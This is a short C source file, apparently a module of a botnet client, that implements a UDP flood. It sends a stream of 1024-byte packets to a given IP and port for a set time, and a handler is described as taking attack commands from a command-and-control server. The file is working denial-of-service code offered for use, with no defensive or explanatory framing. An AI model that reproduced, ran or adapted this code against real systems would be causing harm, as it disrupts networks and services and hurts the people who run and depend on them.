#include "attacks.h"
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

// yeah, testing udp method and very nice
void udp_attack(char *target_ip, int target_port, int duration) {
    int sock;
    struct sockaddr_in target_addr;
    char buffer[1024];

    // create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {

    }

    // setup args
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);

    // random data
    memset(buffer, 0xff, sizeof(buffer));

    #ifdef DEBUG
    printf("Starting UDP flood on %s:%d for %d seconds...\n", target_ip, target_port, duration);
    #endif

    // record attack durations
    time_t start_time = time(NULL);

    while (time(NULL) - start_time < duration) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    // close all socket after attack done
    close(sock);
    #ifdef DEBUG
    printf("Attack finished.\n");
    #endif
}

// handle attack command for connect to cnc
void handle_attack_command(int sock, char *target_ip, int target_port, int duration) {
    udp_attack(target_ip, target_port, duration);
}
